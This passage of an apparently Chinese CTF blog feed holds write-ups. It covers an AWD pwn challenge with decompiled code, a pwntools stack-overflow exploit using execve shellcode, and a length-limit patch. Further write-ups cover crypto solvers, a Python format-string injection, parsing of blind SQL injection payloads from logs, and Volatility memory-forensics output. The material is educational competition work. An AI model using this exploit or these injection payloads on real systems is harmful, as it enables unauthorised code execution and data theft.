class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  int v5; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v7; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v8; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v9; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int16 v10; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned int v11; // [rsp+38h] [rbp-8h]</span><br><span class="line">  int v12; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  v9 = 0LL;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  alarm(0x14u);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  v3 = stdin;</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  menu(v3, 0LL);</span><br><span class="line">  while ( v12 &lt;= 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    puts(&quot;Enter your choice:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">    switch ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        magic(&amp;buf, v11); // 地址泄露</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        puts(&quot;What?&quot;);</span><br><span class="line">        read(0, &amp;buf, 0x40uLL); // 栈溢出</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        what(); // 没用的</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v12;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall magic(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == 0x12345678 )</span><br><span class="line">    result = printf(&quot;It is magic: [%p]?\n&quot;, a1);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数功能不多，漏洞很明显：</p><ol><li>magic函数可以泄露栈地址，前提是v11是0x12345678。</li><li>case 3可以进行栈溢出，刚好能覆盖到返回地址。</li></ol><p>那么思路就是：</p><ol><li>溢出覆盖v11为0x12345678，然后进行magic函数获取buff地址。</li><li>将shellcode写入buff，然后栈溢出覆盖返回地址为buff地址。</li></ol><p>buf有0x38的长度供写入shellcode，卓卓有余，网上可以找22字节左右的shellcode，当然也可以自己写。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.send(p64(<span class="number">0x12345678</span>)*<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    addr = int(p.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    success(hex(addr)) <span class="comment"># 0x7f09b7083000 0x7ffe28596f00</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">    <span class="keyword">print</span> len(shellcode)</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)+p64(addr)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>getshell的关键点是栈溢出，因此只要把输入长度限制到0x30，漏洞就无法利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040086B                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000040086F                 mov     edx, 30h        ; nbytes</span><br><span class="line">.text:0000000000400874                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400877                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040087C                 call    _read</span><br></pre></td></tr></table></figure><p>题目没有设置更高级的漏洞，略显无趣。</p><p>比较过分的是，有队伍进行了提权，然后把flag删除了，只能在flag刷新的时候疯狂跑EXP，有机会在对方删flag前拿到。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于 &lt;a href=&quot;https://xz.aliyun.com/t/6416&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6416&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;广东强网杯AWD题目分析&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="awd" scheme="https://4f-kira.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>JTWLB-CTF-Writeup</title>
    <link href="https://4f-kira.github.io/2019/09/05/jtwlb-ctf/"/>
    <id>https://4f-kira.github.io/2019/09/05/jtwlb-ctf/</id>
    <published>2019-09-05T13:33:35.000Z</published>
    <updated>2019-09-06T02:53:07.191Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JTWLB-CTF非官方writeup"><a href="#JTWLB-CTF非官方writeup" class="headerlink" title="JTWLB CTF非官方writeup"></a>JTWLB CTF非官方writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次JT的CTF题目质量还是不错的，但是运维CTF加一起才5小时，时间实在太紧，而且CTF的性价比明显不高，大部分题目都不只一个考点，也设了不少坑（出题人称为了防止AK）。比赛的时候，很多题目都没时间打开看，因此赛后重新把没做出来的题目复现一下，简单写了一下writeup，各位大佬如果有哪里看不懂，也不要找我，找出题人去~</p><p><img src="http://md.36huo.com/uploads/upload_f1b829a70a5da40b0c480868dbadccb1.png" alt=""></p><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>题目提供的e=33，不是素数，直接求d会报错，因此需要先用e=11求出一个d，然后进行一次解密，之后就是e=3的套路了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">p=<span class="number">115527813793076185316851381449805634312168762458657191403286815066526250953188706928583056798579604342852966744015346317325822694054887219898915721915782637754329465514052854924553817535032759938725270570934210214428213523012934841467181935253769089655932739804044118941188314706468747928929674022797932677491</span></span><br><span class="line">q=<span class="number">166400672883439986828248067692123363689048001045100362967157232932898845079847645677561248632693179197251519134531321011154377754163164855606639412545072704732134708868296084256496193743609181923015517115351345445824153230019197616579730076056575061573322756305055859636790371958064604509869192577321790513607</span></span><br><span class="line">e=<span class="number">33</span></span><br><span class="line">c=<span class="number">2115560894194923855739630759560263432863369647495989278797186061331927960652175182534536593259714647189428014744205682895048988970744494185844850545176656896750073471540369186693731841022954707114460986390619090986241777895532597176340296883545005058917849321578371609829147178589075514145416374661047508694566576157432639591003296975055455249269260800329069263661498941662392614602189878893057734163983485998267416879197126412977444307775211162627226211229437593330963712320994664878058875181731837287047039480049127389471576406574432640255100250675953098648028434804235316276464230311654580987077193891045891045379</span></span><br><span class="line"></span><br><span class="line">d = invmod(<span class="number">11</span>,(q<span class="number">-1</span>)*(p<span class="number">-1</span>)) </span><br><span class="line">c3 = pow(c,d,q*p) </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c3+i*q*p,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="keyword">True</span>):</span><br><span class="line">        <span class="keyword">print</span> i,res,n2s(int(res[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure></p><h3 id="easyCrypto"><a href="#easyCrypto" class="headerlink" title="easyCrypto"></a>easyCrypto</h3><p>古典加密算法告诉我们，只要加密算法不泄露，那就很安全。什么单表替换，什么移位、栅栏，统统都不用。 来,加密接口给你，随便你试。</p><p>纯脑洞，加密算法是加法，例如<code>181d</code>为<code>chr(0x18+0x1d)</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'52112013243f2a0f280b22131e181f19412322101b192113260c0c29540d191e2b380d2b1f112017273c134f51121f133034191f191a560d10250b2521162312'</span></span><br><span class="line">b=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">4</span>):</span><br><span class="line">    b+=chr(int(<span class="string">'0x'</span>+a[i:i+<span class="number">2</span>],<span class="number">16</span>)+int(<span class="string">'0x'</span>+a[i+<span class="number">2</span>:i+<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> b</span><br></pre></td></tr></table></figure></p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere+++"></a>Vigenere+++</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> secret_file  <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_l</span><span class="params">(idx, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s[idx:] + s[:idx]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(p, k1, k2)</span>:</span></span><br><span class="line">    s = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;"</span></span><br><span class="line">    t = [[_l((i+j) % len(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s))] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p:</span><br><span class="line">        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]</span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % len(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % len(k2)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">flag=<span class="string">"flag&#123;************************&#125;"</span></span><br><span class="line">key=<span class="string">"**********"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># * 为马赛克，长度为1。 </span></span><br><span class="line"><span class="comment"># hint：  可以自己尝试下运行加密函数，看看秘钥对加密结果的影响。 </span></span><br><span class="line"><span class="comment"># hint：  首先根据线索求秘钥，秘钥不唯一，找到一个有效的，就能爆破flag了。 </span></span><br><span class="line"><span class="keyword">print</span> main(flag, key, key[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序运行结果（即密文为）:</span></span><br><span class="line"><span class="comment"># &#125;z_&#123;xv0uzXMHo2HKN8&#123;SiY3A_81UoW</span></span><br></pre></td></tr></table></figure><p><del>不难看出</del>密码表有<code>t[i][j][k]=t[i][k][j]</code>这个规律，由于加密的key1和key2是互为倒序，j+k是固定值，那么只要固定5位（前后无所谓），然后爆破另外5位就OK了。对于相同的明文来说，可能有多个密钥使其生成相同的密文。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_l</span><span class="params">(idx, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s[idx:] + s[:idx]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(ct, k1, k2)</span>:</span></span><br><span class="line">    s = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;"</span></span><br><span class="line">    t = [[_l((i + j) % len(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s))] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:</span><br><span class="line">                decrypted += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % len(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % len(k2)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(plain, cipher, key_len)</span>:</span></span><br><span class="line">    s = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;"</span></span><br><span class="line">    t = [[_l((i + j) % len(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s))] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    key = [<span class="string">'*'</span>] * key_len</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="keyword">for</span> i2 <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> t[s.find(plain[i])][s.find(s[i1])][s.find(s[i2])] == cipher[i]:</span><br><span class="line">                    key[i] = s[i1]</span><br><span class="line">                    key[key_len<span class="number">-1</span>-i] = s[i2]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(key)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">"&#125;z_&#123;xv0uzXMHo2HKN8&#123;SiY3A_81UoW"</span></span><br><span class="line">key = get_key(<span class="string">"flag&#123;"</span>, ciphertext, <span class="number">10</span>)</span><br><span class="line">flag = decrypt(ciphertext, key, key[::<span class="number">-1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>LSB，RGB 3个通道各有一个二维码，过程略。</p><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/home/ctf/flag'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag=f.readline()</span><br><span class="line">userdata = &#123;<span class="string">"user"</span> : <span class="string">"hacker"</span>, <span class="string">"flag"</span> : flag &#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Input flag:"</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">input_flag  = raw_input(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> input_flag != userdata[<span class="string">"flag"</span>]:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Flag "</span> + input_flag + <span class="string">" is wrong for user %(user)s"</span>) % userdata</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Flag is your input"</span>)</span><br></pre></td></tr></table></figure><p>最简单的一题，直接<code>%s</code>，或者<code>%(flag)s</code>。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志里面有很明显的数据库注入语句，使用的是布尔二分法注入，比赛的时候我是直接人工智障处理的（简单来说就是人肉看，不推荐），还是写代码比较正路。</p><p>二分法注入脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'8.pcapng'</span>,<span class="string">'rb'</span>)</span><br><span class="line">res = open(<span class="string">'res.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">  tmp = i</span><br><span class="line">  re1 = re.findall(<span class="string">r'/\?id=1\'/\*\*/and/\*\*/(.*) HTTP/1.1'</span>,i)</span><br><span class="line">  <span class="keyword">if</span> len(re1) &gt; <span class="number">0</span>:</span><br><span class="line">      res.write(re1[<span class="number">0</span>]+<span class="string">'|'</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'Content-Length: 332'</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">'Content-Length: 366'</span> <span class="keyword">in</span> i:</span><br><span class="line">      res.write(i)</span><br><span class="line">res.close()</span><br><span class="line"></span><br><span class="line">res = open(<span class="string">'res.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">check = [<span class="number">32</span>,<span class="number">126</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res.readlines():</span><br><span class="line">    <span class="comment"># ascii(substring((select/**/keyid/**/from/**/flag/**/limit/**/0,1),1,1))%3C79%23|Content-Length: 332</span></span><br><span class="line">    tag = re.findall(<span class="string">r',(\d&#123;,2&#125;),1\)\)%3C(\d&#123;,3&#125;)%23\|Content-Length: (\d&#123;3&#125;)'</span>,i)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> tag[<span class="number">2</span>] == <span class="string">'332'</span>: <span class="comment"># False</span></span><br><span class="line">        check[<span class="number">0</span>] = int(tag[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check[<span class="number">1</span>] = int(tag[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> check</span><br><span class="line">    <span class="keyword">if</span> check[<span class="number">1</span>] - check[<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">        flag += chr(check[<span class="number">0</span>])</span><br><span class="line">        check = [<span class="number">32</span>,<span class="number">126</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!]'</span>,flag</span><br></pre></td></tr></table></figure></p><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/volatility# python vol.py -f 2.data --profile=WinXPSP1x64 psscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Offset(P)          Name                PID   PPID PDB                Time created                   Time exited</span><br><span class="line">------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------</span><br><span class="line">0x00000000008da800 winlogon.exe        372    296 0x0000000006779000 2019-08-17 07:21:05 UTC+0000</span><br><span class="line">0x00000000008dac20 csrss.exe           348    296 0x0000000006b09000 2019-08-17 07:21:05 UTC+0000</span><br><span class="line">0x00000000009684b0 services.exe        420    372 0x000000000852a000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x00000000009f46b0 smss.exe            296      4 0x0000000007974000 2019-08-17 07:21:03 UTC+0000</span><br><span class="line">0x000000000144c770 explorer.exe       1460   1440 0x000000000c637000 2019-08-17 07:21:30 UTC+0000</span><br><span class="line">0x000000000145a650 svchost.exe        1152    420 0x000000000cf6d000 2019-08-17 07:21:24 UTC+0000</span><br><span class="line">0x000000000146b040 msdtc.exe          1056    420 0x000000000b0a5000 2019-08-17 07:21:24 UTC+0000</span><br><span class="line">0x0000000001734b10 cmd.exe            2448   1296 0x000000000f406000 2019-08-17 07:30:53 UTC+0000   2019-08-17 07:30:53 UTC+0000</span><br><span class="line">0x0000000005a79040 pythonw.exe        2412   2364 0x000000000dc1c000 2019-08-17 07:30:40 UTC+0000</span><br><span class="line">0x0000000005faac20 spoolsv.exe        1028    420 0x000000000a7e8000 2019-08-17 07:21:23 UTC+0000</span><br><span class="line">0x0000000005fb69a0 ipconfig.exe       2456   2448 0x0000000000765000 2019-08-17 07:30:53 UTC+0000   2019-08-17 07:30:53 UTC+0000</span><br><span class="line">0x00000000060e0c20 System                4      0 0x000000000fd01000</span><br><span class="line">0x000000000714da50 vmtoolsd.exe       1832   1460 0x0000000007524000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x0000000007288c20 TPAutoConnSvc.e    1776    420 0x000000000708f000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x00000000092acc20 vmacthlp.exe        620    420 0x00000000091aa000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x00000000096a6040 svchost.exe         664    420 0x000000000986e000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x00000000098367d0 ctfmon.exe         1840   1460 0x000000000b8a0000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x0000000009a19040 svchost.exe         720    420 0x0000000009818000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x0000000009c10ab0 svchost.exe         784    420 0x0000000009e89000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x0000000009fc6040 svchost.exe         816    420 0x000000000a044000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x000000000a163040 svchost.exe         852    420 0x000000000a162000 2019-08-17 07:21:06 UTC+0000</span><br><span class="line">0x000000000a3751f0 wmiprvse.exe       1940    664 0x000000000b0a1000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x000000000b03d040 pythonw.exe        2364   1460 0x0000000008048000 2019-08-17 07:30:31 UTC+0000</span><br><span class="line">0x000000000b106c20 VGAuthService.e    1260    420 0x000000000cae7000 2019-08-17 07:21:24 UTC+0000</span><br><span class="line">0x000000000b617040 dllhost.exe        2036    420 0x000000000e070000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x000000000bf68040 ctfmon.exe         1908   1840 0x0000000009550000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x000000000c0af040 dllhost.exe        1952    420 0x000000000c0b0000 2019-08-17 07:21:32 UTC+0000</span><br><span class="line">0x000000000cba6c20 svchost.exe        1660    420 0x000000000d7bd000 2019-08-17 07:21:31 UTC+0000</span><br><span class="line">0x000000000d942650 TPAutoConnect.e    2176   1776 